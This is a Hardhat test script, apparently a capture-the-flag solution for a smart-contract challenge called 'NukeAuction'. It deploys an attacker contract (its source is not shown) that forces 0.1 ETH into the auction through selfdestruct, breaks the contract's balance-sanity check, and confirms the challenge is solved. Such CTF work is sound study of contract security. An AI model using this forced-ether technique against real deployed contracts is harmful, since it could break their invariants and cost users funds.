import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("NukeAuction", function () {
    let signer: Signer;
    let player: string;
    let challengeFactory: ContractFactory;
    let challenge: Contract;
    let challenge_instance_address = "0x75eecf3068BCeA81b904986451038a9328329Adf";

    before(async () => {
        [signer] = await ethers.getSigners();
        player = await signer.getAddress();
        console.log("Primary Signer Address:", player);
        challengeFactory = await ethers.getContractFactory("NukeAuction");
        challenge = challengeFactory.attach(challenge_instance_address);
    });

    it("Should solve the challenge", async () => {
        let auctionSane = await challenge.isAuctionSane();
        console.log("Is auction sane?", auctionSane)

        // Let's deploy the self-destructor contract that will 
        // transfer the amount through a selfdestruct
        // necessary to solve the challenge:

        const attackerFactory = await ethers.getContractFactory("NukeAuctionAttacker");
        const attacker = await attackerFactory.deploy();
        await attacker.deployed();

        const tx = {
            value: ethers.utils.parseEther("0.1"),
            gasLimit: 100000
        };

        const attackTx = await attacker.attack(challenge.address, tx);
        const attackReceipt = await attackTx.wait();
        
        auctionSane = await challenge.isAuctionSane();
        console.log("Is auction sane?", auctionSane);

        const challengeSolved = await challenge.isSolved();
        console.log("challengeSolved ?", challengeSolved);

        expect(challengeSolved).to.equal(true);
    });
});